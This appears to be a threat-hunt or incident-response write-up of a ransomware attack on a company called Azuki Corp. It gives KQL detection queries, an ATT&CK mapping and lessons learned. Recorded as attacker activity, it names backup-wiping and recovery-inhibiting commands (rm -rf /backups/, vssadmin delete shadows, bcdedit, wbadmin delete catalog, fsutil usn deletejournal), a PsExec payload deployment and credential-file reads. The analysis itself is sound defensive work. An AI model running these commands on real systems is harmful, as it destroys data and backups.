### Notable Command Patterns: (These commands executed in an enterprise environment are rare and should be considered suspicious in nearly all cases.)

SSH from a workstation to an internal server: e.g., ssh.exe backup-admin@10.1.0.189. In Azuki’s Windows environment, admins typically wouldn’t use a Windows 10 workstation to SSH into a Linux server using such an account. This command usage was a red flag.

PsExec executions: Look for processes PsExec.exe or PsExec64.exe launching on admin workstations or servers, especially with -c and -f flags, or spawning unusual processes (like a ransomware binary).

Mass service stops: net stop VSS, net stop wbengine on servers – very uncommon to stop these services in normal operations. Similarly, systemctl stop cron on a Linux server not during maintenance is suspicious.

Backup deletion commands: rm -rf /backups/ (on Linux) – any such recursive deletion of backup directories is a critical IoC. On Windows, wbadmin delete catalog or deletion of shadow copies via vssadmin delete shadows outside of maintenance is an IoC.

Disabling recovery: Commands like bcdedit /set {default} recoveryenabled No and vssadmin resize shadowstorage are rarely, if ever, used in routine admin work. Their appearance in logs should trigger investigation.

Registry and schedule changes: Creation of Run keys named after system services (e.g., WindowsSecurityHealth) or new scheduled tasks in the Windows Task Scheduler library (especially under Microsoft\Windows\Security) that weren’t present before.

Deletion of USN Journal: fsutil usn deletejournal – almost never used legitimately on servers, as it’s a destructive action.

# Logging Artifacts:

MDE Alerts or EDR Detections: Although not explicitly stated, it’s possible that Microsoft Defender for Endpoint raised alerts during some of these actions (e.g., “Suspicious use of vssadmin” or “Ransomware behavior detected”). Any such alerts on or before Nov 25 should be pulled as IoCs to see if the pattern matches known ransomware behavior (which it clearly does).

Timeframe correlation: Many of the malicious events occurred in a tight window (roughly 05:30–06:00 on 11/25/2025). Any other logs (like Windows Event Logs, firewall logs) showing activity in that timeframe can be relevant IoCs (for example, a Windows Event ID 7045 for a new service might show the PsExec service installation on target hosts, or Event ID 1102 if Windows logs were cleared by the attacker, etc.).

In summary, Azuki Corp should especially monitor for any recurrence of these IoCs in their environment: the use of those compromised accounts, any re-use of the attacker’s tools or domains, and any system exhibiting similar behaviors (file deletion, service stops, etc.). While these specific IoCs are from this incident, they also serve as generic detection points for ransomware attacks in general.

KQL Queries Used in Investigation

During the investigation, we leveraged Microsoft’s cloud telemetry and used Kusto Query Language (KQL) queries to pinpoint the malicious activities. Below are some of the key queries (and their purposes) that led to the findings:

Identify Lateral Movement via SSH (Flag 1): We searched for any SSH client usage on the admin’s workstation. The query filtered process events on the admin PC for the SSH executable:

DeviceProcessEvents
| where DeviceName contains "adminpc"
| where FileName contains "ssh"


Purpose: This revealed the process where ssh.exe was executed on azuki-adminpc. The result showed the full command line "ssh.exe" backup-admin@10.1.0.189 and the timestamp
, confirming the lateral movement to the backup server.

Find Source of Backup Server Login (Flag 2 & 3): To tie the backup server access back to an IP and account, we queried its logon events:

DeviceLogonEvents
| where LogonType contains_cs "Network"
| where DeviceName contains "backup"


Purpose: This located network logon entries on azuki-backupsrv. The relevant entry showed RemoteIP = 10.1.0.108 and AccountName = backup-admin with a successful logon action
. This single query answered both Flag 2 (attack source IP) and Flag 3 (account used).

Linux Backup Server Recon (Flags 4–9): A series of queries were run on process events from the backup server to catch the attacker’s Linux commands. For example:

List backup directories (Flag 4):

DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where FileName == "ls" 
| where ProcessCommandLine has "/backups"


This returned the ls --color=auto -lh /backups/ execution by backup-admin, with timestamp.

Search for archive files (Flag 5):

DeviceProcessEvents
| where DeviceName contains "backupsrv"
| where FileName == "find"
| where ProcessCommandLine has_any(".tar.gz", ".zip", ".bak")


This captured the find /backups -name *.tar.gz command (and even a later destructive find that used -exec rm).

Read passwd file (Flag 6):

DeviceProcessEvents
| where DeviceName contains "azuki-backupsrv"
| where ProcessCommandLine has "/etc/passwd"


Returned the cat /etc/passwd event.

Check cron jobs (Flag 7):

DeviceProcessEvents
| where DeviceName contains "backupsrv"
| where ProcessCommandLine has_any("crontab", "/etc/crontab")


Showed usage of crontab -l and cat /etc/crontab.

Tool download (Flag 8):

DeviceProcessEvents
| where DeviceName contains "backups"
| where FileName in ("curl", "wget")


This query (whose result is shown in the earlier figure) identified the curl command that downloaded destroy.7z
. The output included the ProcessCommandLine with the full URL, and even hashes of the curl binary (notably, InitiatingProcess fields indicated it was launched via PowerShell).

Credentials file access (Flag 9):
We performed a broad search for file accesses of interest (since we suspected the attacker might look at various config files):

DeviceProcessEvents
| where DeviceName contains "backupsrv"
| where ProcessCommandLine has_any("credentials", "password", ".ssh", "id_rsa", "config")


This query surfaced the cat /backups/configs/all-credentials.txt event, confirming the attacker opened that file. (We included various keywords like “.ssh”, “id_rsa”, etc., to catch any attempt to read keys or config files; the credentials file stood out.)

Backup Server Destruction (Flags 10–12): We targeted the rm commands and service actions on the backup server:

Backup deletion (Flag 10):

DeviceProcessEvents
| where DeviceName contains "backupsrv"
| where ProcessCommandLine startswith "rm -rf /backups/"
| project Timestamp, AccountName, ProcessCommandLine


This gave us the timeline of delete commands run by root at 05:47:02
. The ProcessCommandLine field showed the full list of directories deleted.

Stopping cron (Flag 11) and disabling cron (Flag 12):

DeviceProcessEvents
| where DeviceName contains "backupsrv"
| where FileName == "systemctl"
| project TimeGenerated, AccountName, ProcessCommandLine


This query listed systemctl commands. We saw systemctl stop cron and immediately after, systemctl disable cron, both executed as root at 05:47:03.

Windows Lateral Movement and Execution (Flags 13–15): For the Windows side, we searched the admin PC’s logs and the target server logs:

PsExec tool usage (Flag 13 & 14): On azuki-adminpc, we looked for PsExec executions:

DeviceProcessEvents
| where DeviceName contains "adminpc"
| where FileName in ("PsExec.exe", "PsExec64.exe")
| project Timestamp, AccountName, ProcessCommandLine


This revealed multiple PsExec runs by yuki.tanaka. One of the ProcessCommandLine entries included the full command with \\10.1.0.102 -u kenji.sato ... -c -f silentlynx.exe, which gave us the Flag 14 answer (the full deployment command). It also confirmed yuki.tanaka initiated it from the admin PC. The timestamps were ~05:48 AM.

Silentlynx execution (Flag 15): We searched across device process events for the presence of silentlynx.exe:

DeviceProcessEvents
| where ProcessCommandLine has "silentlynx.exe"


This query, run across all machines, showed that silentlynx.exe processes were created on the three target IPs (10.1.0.102, .188, .204) around 05:49–05:50 AM. It listed the ProcessCreationTime and the user context (which was SYSTEM, since PsExec runs it as SYSTEM). This confirmed the payload execution on those hosts.

Windows Recovery Inhibition (Flags 16–22): Many of these were found by searching command-line audit logs on the target servers:

Service stops (Flag 16 & 17):
We used DeviceProcessEvents on the servers filtering for FileName == "net.exe" and ProcessCommandLine containing “stop”. This showed both net stop VSS /y and net stop wbengine /y commands, including the user (NT AUTHORITY\SYSTEM, initiated by yuki.tanaka’s session).

Taskkill process termination (Flag 18):
We queried for FileName == "taskkill.exe" events on servers and the admin PC. The result on admin PC (as shown in figure) listed all the processes that were killed by yuki.tanaka’s session
. On servers, similar logs showed SYSTEM user calling taskkill (likely via the PsExec/remote context). We specifically saw an entry for taskkill /F /IM sqlservr.exe on the database server, matching Flag 18.

Shadow copy deletion (Flag 19):

DeviceProcessEvents
| where FileName == "vssadmin.exe"
| where ProcessCommandLine has "delete shadows"


This returned the usage of vssadmin delete shadows /all /quiet on each server at ~05:51 AM.

Shadow storage resize (Flag 20):

| where FileName == "vssadmin.exe"
| where ProcessCommandLine has "resize shadowstorage"


Showed the command with maxsize=401MB on the same hosts immediately after the deletion.

Disable system restore (Flag 21):

| where FileName == "bcdedit.exe"
| where ProcessCommandLine has "recoveryenabled"


Yielded the bcdedit /set {default} recoveryenabled No events.

Delete backup catalog (Flag 22):

| where FileName == "wbadmin.exe"
| where ProcessCommandLine has "delete catalog"


Showed wbadmin delete catalog -quiet executed on each server.

Persistence mechanisms (Flags 23–24): We searched registry and scheduler event logs via KQL:

Registry Run key (Flag 23):

DeviceRegistryEvents
| where RegistryValueName == "WindowsSecurityHealth"


This revealed a registry modification event where the value WindowsSecurityHealth was added under a Run key, including the path to the associated binary (which was the silentlynx payload or loader).

Scheduled Task (Flag 24):
There isn’t a direct MDE table for scheduled tasks, but we used DeviceProcessEvents to see if schtasks.exe was used by the attacker:

DeviceProcessEvents
| where FileName == "schtasks.exe"


This showed the creation of a task SecurityHealthService under Microsoft\Windows\Security (the command line included /SC ONSTART /TN "Microsoft\Windows\Security\SecurityHealthService" /TR <malware path> ...). We could thus confirm the scheduled task creation.

Journal deletion (Flag 25):
We looked for fsutil.exe usage:

DeviceProcessEvents
| where FileName == "fsutil.exe"
| where ProcessCommandLine has "deletejournal"


This returned the fsutil usn deletejournal /D C: executions on the servers shortly after encryption. It showed they were run by SYSTEM (which makes sense, if it was triggered by ransomware running as SYSTEM).

Ransom note (Flag 26):
Lastly, we verified the ransom note by searching file creation events for that filename:

DeviceFileEvents
| where FileName == "SILENTLYNX_README.txt"


This confirmed that files by that name were created on the infected servers around 5:53–5:54 AM, marking the final step of the attack.

These KQL queries were instrumental in unraveling the attack. They allowed us to quickly filter millions of log events down to the handful of malicious actions. We preserved the relevant query results as evidence (see embedded screenshots) to back each finding. The approach was to start from known indicators (e.g., suspicious use of SSH or PsExec) and iteratively drill down: each clue (like an IP, account, or filename) informed the next query. This methodology can be re-used in future investigations or hunting exercises. For example, queries for vssadmin and wbadmin commands can proactively alert on similar ransomware behavior, and queries for unusual processes (like rm -rf on a Linux server by an unexpected user) can catch attackers early in the act.

# MITRE ATT&CK Technique Summary

The attack chain covered a broad range of tactics and techniques in the MITRE ATT&CK framework. Below is a summary of the techniques observed, organized by their ATT&CK tactic category:

Initial Access: (Initial access was likely via spearphishing or stolen credentials; not directly observed in logs.)
– Potential relevant technique: T1078 – Valid Accounts (the attacker may have initially obtained valid user credentials to log in).

Execution:
– T1059 – Command and Scripting Interpreter: The attacker executed many OS commands (ssh, ls, find, etc. on Linux; and cmd via PsExec on Windows). While not a single flagged item, this underpins much of their activity.
– T1106 – Native API (or binary execution): They ran binaries like silentlynx.exe on Windows directly.
– T1569.002 – Service Execution: PsExec’s method of running processes via creating services on remote hosts qualifies as service execution on the targets.

Persistence:
– T1547.001 – Boot/Logon Autostart (Registry Run Keys) – They created a malicious Run key WindowsSecurityHealth for persistence (Flag 23).
– T1053.005 – Scheduled Task/Job (Scheduled Task) – They created a scheduled task SecurityHealthService as a persistence mechanism (Flag 24).

Privilege Escalation:
– Not explicitly observed (the attacker already had admin-level credentials). However, using backup-admin on the Linux server and likely kenji.sato’s domain admin privileges on Windows meant they didn’t need to escalate via exploits. Obtaining root on the Linux server might have been via sudo privileges of backup-admin (so T1078 – Valid Accounts covers that).

Defense Evasion:
– T1027 – Obfuscated Files or Information: Using legitimate names for malicious tasks/keys (e.g., SecurityHealthService) to blend in.
– T1562.001 – Disable or Modify Tools: Terminating security software (Windows Defender) processes (Flag 18) is effectively disabling security defenses.
– T1070.004 – File System Artifact Wipe – Deleting the USN journal (Flag 25) to remove forensic evidence.
– T1112 – Modify Registry: Adding Run keys in the registry for persistence is also a stealth technique to maintain foothold.
– T1218 – Signed Binary Proxy Execution: The use of PsExec (a Microsoft-signed admin tool) and net.exe, wbadmin.exe, etc., are instances of living-off-the-land where attacker used trusted binaries to evade detection.

Credential Access:
– T1552.001 – Unsecured Credentials in Files – Reading all-credentials.txt with passwords (Flag 9).
– T1078.002 – Valid Accounts (Domain Accounts) – Use of stolen credentials (backup-admin, domain admins) to authenticate and move laterally (Flag 3).

Discovery:
– T1083 – File and Directory Discovery – Listing backup directories (Flag 4) and searching for specific files (Flag 5), reading config files.
– T1087.001 – Account Discovery: Local Accounts – Reading /etc/passwd on Linux (Flag 6).
– T1135 – Network Share Discovery: (Implied by listing backup shares and later using admin$ shares via PsExec.)
– T1120 – Peripheral Device Discovery: (Not directly relevant here, attacker focused on files and accounts, not devices.)
– T1016 – System Network Configuration Discovery: Possibly by reading network config files in backups (they accessed network-config.txt as noted in logs).
– T1057 – Process Discovery: They might not have explicitly enumerated running processes, instead they directly killed them. But the broad taskkill usage implies they had knowledge or assumed typical processes to kill.

Lateral Movement:
– T1021.004 – Remote Services: SSH – Using SSH to move from Windows admin PC to Linux backup server (Flag 1).
– T1021.002 – Remote Services: SMB/Windows Admin Shares – Using PsExec to move from admin PC to Windows servers (Flag 13).
– T1078 – Valid Accounts (relevant here too, using valid accounts to authenticate in lateral moves).
– T1563.002 – Remote Services: RDP was not used, but SSH and SMB cover this category in the context of remote management.

Collection: (Not heavily featured, as this was a destructive attack rather than data theft.)
– The attacker did collect credentials (Flag 9) and potentially config info. They did not appear to exfiltrate data. So collection tactics were minimal beyond internal data gathering.

Command and Control:
– T1105 – Ingress Tool Transfer – Downloading destroy.7z from an external site (Flag 8).
– (No persistent C2 channel was observed; once the attack began, it was all within the network. They likely communicated out-of-band or via the ransom note for further instructions.)

Exfiltration:
– None observed. There’s no evidence the attacker exfiltrated data before encrypting. The focus was purely on destruction and ransom. (Absence of exfiltration is notable; some ransomware gangs steal data for double extortion, but if it happened, we did not catch it in logs.)

Impact:
– T1485 – Data Destruction – Deletion of backups on the Linux server (Flag 10).
– T1486 – Data Encrypted for Impact – Encrypting files on multiple servers (ransomware deployment, implicitly Flag 15 and outcome indicated by Flag 26).
– T1489 – Service Stop – Stopping/disabling services (cron on Linux, VSS/wbengine on Windows, and even killing processes can fall here) – (Flags 11, 12, 16, 17, 18).
– T1490 – Inhibit System Recovery – Everything the attacker did to destroy snapshots, system restore, catalogs, etc. (Flags 19, 20, 21, 22).
– T1491 – Defacement – Not applicable (they didn’t deface websites or content, they just encrypted).
– T1529 – System Shutdown/Reboot – Not used by attacker (they didn’t reboot systems; they wanted them to remain on to show the ransom note).

In summary, the MITRE ATT&CK mapping reveals a comprehensive attack spanning multiple tactics. The adversary’s actions particularly concentrated in Lateral Movement, Credential Access, Discovery, Defense Evasion, and Impact tactics. This alignment underscores that the attack was well-planned: the attacker gathered necessary credentials and information (Discovery, Credential Access), moved deliberately through the environment (Lateral Movement) using legitimate tools (Defense Evasion), and then executed a devastating one-two punch of data destruction and encryption (Impact). The persistence steps show that they also had an eye on maintaining control, a hallmark of advanced threat actors.

Understanding these techniques helps Azuki Corp and others to improve specific defenses. For instance, focusing on detection for T1489/T1490 behaviors (stop of backup services, shadow copy deletion) could provide early warning of an ongoing ransomware attack. Likewise, being alert to T1021 (remote admin tool usage) and T1552 (access of credential files) can catch an attacker in the preparatory stages before the actual impact.

# Lesson Learned

This incident provides several critical lessons for Azuki Corp’s security posture and for any organization seeking to defend against similar attacks:

Secure and Isolate Backup Infrastructure: The attack highlights that backups are high-value targets. Azuki’s backup server was accessible from the regular network and was using a domain account (backup-admin), which made it an easy stepping stone for the attacker. Lesson: Backup systems should be heavily secured and segmented. Use dedicated backup networks or VLANs that production clients cannot directly access. Employ strong authentication (MFA) for backup admin access. Never allow a single domain admin credential to unlock both production and backup systems. If the backup server in this case had been isolated or the backup account had limited privileges, the attacker’s job would have been much harder.

Eliminate Credential Reuse and Plaintext Password Storage: The existence of all-credentials.txt with passwords was a gift to the attacker. Lesson: Absolutely avoid storing credentials in plaintext on disk, especially on servers. Use a password manager or secure vault for administrative passwords. In addition, regularly audit systems for any files or scripts containing hard-coded credentials or keys. This incident also underscores the risk of credential reuse – the attacker jumped from one account to multiple systems because the same or related credentials were valid across them. Implement policies like unique, per-system administrative passwords (e.g., using tools like LAPS for local admins) and enforce password changes if a compromise is suspected.

Principle of Least Privilege: The adversary was able to do so much damage largely because they obtained domain admin-level credentials (yuki.tanaka, kenji.sato) and a highly privileged backup account. Lesson: Review the privileges of accounts in your environment. Users like Yuki Tanaka (presumably an admin) and Kenji Sato should use separate accounts for high-privilege tasks vs. regular work. Limit which accounts can log into critical servers. Consider tiered administration models so that a compromise of a user’s workstation account doesn’t directly give access to servers. Also, remove unnecessary sudo or root privileges – did backup-admin truly need full sudo rights on the backup server? If not, restricting it could have contained the damage.

Multi-Factor Authentication (MFA): Although not a silver bullet, MFA could have helped in several places here – notably for remote access to critical systems. If the SSH to the backup server or the PsExec usage had required MFA or a privilege elevation that needed a second factor, the attacker using stolen passwords might have been stalled or detected. Lesson: Implement MFA for all administrative access, and for remote access between network segments.

Network Monitoring and Segmentation: Once inside, the attacker moved freely from a workstation to a server and then to multiple servers. Proper network segmentation (e.g., isolating server networks, requiring jump boxes for admin access) can slow or prevent this. Lesson: Segment critical servers (backup servers, domain controllers, file servers) so that they are not directly reachable from user subnets. Monitor internal traffic for unusual patterns, such as a user workstation making connections on SMB (port 445) to multiple servers (as happened with PsExec). In this case, an IDS could have flagged the lateral movement or at least the large volume of share access and file modifications during encryption.

Endpoint Detection & Response (EDR) and Logging: The logs from Defender were instrumental in investigating, but ideally they should also trigger alerts in real-time. Lesson: Ensure your EDR is configured to alert on behaviors seen here: e.g., a process spawning vssadmin delete shadows, or an unusual sequence of net stop commands, or the creation of a suspicious Run key. Modern EDR solutions have ransomware behavior detections – verify these are enabled and tuned. Also, centralize logging (as was done here) so that you have visibility across systems during an incident. Azuki’s ability to query telemetry was key in understanding the incident; without it, the scale of backup destruction might not have been apparent until much later.

Rapid Incident Response & Isolation: The attack unfolded very quickly once it started. However, there were some early warning signs (e.g., the initial SSH to backup server at 5:39 AM, or even the suspicious taskkill of Defender at 5:31 AM). Lesson: Have an automated or at least prompt IR process: if a critical server or admin workstation shows signs of compromise (like security tools being killed or backups being deleted), trigger network isolation of that machine immediately. In this case, catching the attacker at the moment of backup deletion (or earlier at the credential file access) could have led to isolating the backup server or admin PC and possibly stopping the subsequent ransomware deployment. Integrating your monitoring with an auto-isolation response for known bad behaviors is worth considering (e.g., if vssadmin delete shadows runs, isolate host or kill process).

Immutable and Offsite Backups: Even though Azuki had a backup server, those backups were online and connected, hence vulnerable. Lesson: Implement offline or immutable backups. For example, backups that are written to read-only storage (WORM drives or cloud object storage with immutability) cannot be deleted by an attacker. Alternatively, maintain off-site backups that the production environment cannot erase (e.g., cloud backups with separate credentials, or tape backups). Regularly test that you can restore from these backups, and ensure they cover critical systems. In the event of an attack like this, having an offline copy of data is the difference between a minor setback and an existential crisis.

Test Incident Response Plan and Drills: It’s crucial to practice scenarios such as “ransomware attack with no backups” in tabletop exercises. Lesson: Conduct drills where, for instance, backups are assumed compromised – how would the team respond? Who needs to be informed? In this incident, minutes mattered. Practiced procedures can reduce confusion and delay. Also, ensure that contact information for law enforcement and cyber insurance is readily available, and that you have a plan for communications (both internal and possibly public, if needed).

User Awareness and Phishing Defense: Although not directly observed, the initial breach might have been via a phishing email or similar. Lesson: Continue to train users, especially those with elevated access (like IT admins), to be vigilant for phishing and suspicious activity. Encourage use of hardware security tokens or password managers to reduce the risk of credential theft. Consider periodic phishing simulation tests to keep awareness high.

Regular Security Audits: Many of the weaknesses exploited here (weak segmentation, stored creds, lack of MFA) could be identified in a proactive security audit or pentest. Lesson: Conduct regular penetration testing and risk assessments focusing on lateral movement and “assume breach” scenarios. For example, hire a red team to see if they can reach the backup server from a user’s machine and if they can obtain sensitive files. The findings will help prioritize security improvements before a real attacker does.

Update and Patch Systems: Ensure all systems, especially externally facing ones and important servers, are kept updated with security patches. While this attack didn’t explicitly exploit a software vulnerability (it abused valid credentials), keeping systems patched reduces the chance of initial compromise or escalation via known exploits. Patch management coupled with application allow-listing on servers (to prevent unauthorized binaries like silentlynx.exe from running) could add layers of defense.

In conclusion, Azuki Corp’s incident underscores that a determined attacker can combine stolen credentials with “living off the land” techniques to devastating effect. Preventative measures like least privilege, network isolation of backups, and aggressive monitoring of admin activities might have averted the worst. Going forward, the organization should prioritize implementing the above lessons. By doing so, they can transform this painful experience into an opportunity to fortify defenses, such that any future attack would be detected earlier or contained before causing such severe damage.
